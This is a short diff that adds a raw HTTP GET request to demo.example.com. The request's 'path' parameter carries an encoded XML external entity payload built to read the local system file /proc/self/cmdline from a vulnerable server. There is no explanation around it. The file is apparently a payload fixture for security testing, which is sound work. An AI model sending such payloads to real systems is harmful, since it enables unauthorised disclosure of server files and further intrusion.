@@ -1,0 +1,4 @@
+GET /a?path=\u003C!DOCTYPE%20r%20[\u003C!ENTITY%20xxe%20SYSTEM%20\u0022file:///proc/self/cmdline\u0022\u003E]\u003E\u003Cr\u003E\u0026xxe\u003B\u003C/r\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
